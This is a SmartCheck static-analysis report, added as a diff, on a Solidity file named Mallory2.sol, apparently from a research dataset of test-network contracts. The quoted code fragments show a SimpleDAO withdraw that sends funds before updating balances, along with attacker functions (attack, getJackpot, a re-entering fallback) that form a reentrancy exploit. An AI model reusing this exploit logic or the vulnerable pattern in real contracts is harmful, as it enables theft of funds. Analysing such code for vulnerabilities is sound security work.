@@ -1,0 +1,89 @@
+C:\Users\hp\DataSet\contracts\ropsten\47\475d2287b845dfdee152885de1ad3442a6832b0f_Mallory2.sol
+jar:file:/C:/Users/hp/AppData/Roaming/npm/node_modules/@smartdec/smartcheck/jdeploy-bundle/smartcheck-2.0-jar-with-dependencies.jar!/solidity-rules.xmlruleId: SOLIDITY_CALL_WITHOUT_DATA
+patternId: om991k
+severity: 2
+line: 12
+column: 28
+content: call.value(amount)()
+
+ruleId: SOLIDITY_PRAGMAS_VERSION
+patternId: 23fc32
+severity: 1
+line: 1
+column: 16
+content: ^
+
+ruleId: SOLIDITY_UPGRADE_TO_050
+patternId: 83k1no
+severity: 1
+line: 12
+column: 28
+content: call.value(amount)()
+
+ruleId: SOLIDITY_UPGRADE_TO_050
+patternId: 91h3sa
+severity: 1
+line: 21
+column: 13
+content: public
+
+ruleId: SOLIDITY_VISIBILITY
+patternId: 910067
+severity: 1
+line: 6
+column: 2
+content: functiondonate(addressto)payable{credit[to]+=msg.value;}
+
+ruleId: SOLIDITY_VISIBILITY
+patternId: 910067
+severity: 1
+line: 10
+column: 2
+content: functionwithdraw(uintamount){if(credit[msg.sender]>=amount){boolres=msg.sender.call.value(amount)();credit[msg.sender]-=amount;}}
+
+ruleId: SOLIDITY_VISIBILITY
+patternId: 910067
+severity: 1
+line: 17
+column: 2
+content: functionqueryCredit(addressto)returns(uint){returncredit[to];}
+
+ruleId: SOLIDITY_VISIBILITY
+patternId: 910067
+severity: 1
+line: 29
+column: 2
+content: functionMallory2(SimpleDAOaddr){owner=msg.sender;dao=addr;}
+
+ruleId: SOLIDITY_VISIBILITY
+patternId: 910067
+severity: 1
+line: 34
+column: 2
+content: functionattack()payable{dao.donate.value(1)(this);dao.withdraw(1);}
+
+ruleId: SOLIDITY_VISIBILITY
+patternId: 910067
+severity: 1
+line: 39
+column: 2
+content: functiongetJackpot(){dao.withdraw(dao.balance);boolres=owner.send(this.balance);performAttack=true;}
+
+ruleId: SOLIDITY_VISIBILITY
+patternId: 910067
+severity: 1
+line: 45
+column: 2
+content: function()payable{if(performAttack){performAttack=false;dao.withdraw(1);}}
+
+ruleId: SOLIDITY_VISIBILITY
+patternId: b51ce0
+severity: 1
+line: 26
+column: 2
+content: addressowner;
+
+SOLIDITY_VISIBILITY :8
+SOLIDITY_PRAGMAS_VERSION :1
+SOLIDITY_UPGRADE_TO_050 :2
+SOLIDITY_CALL_WITHOUT_DATA :1
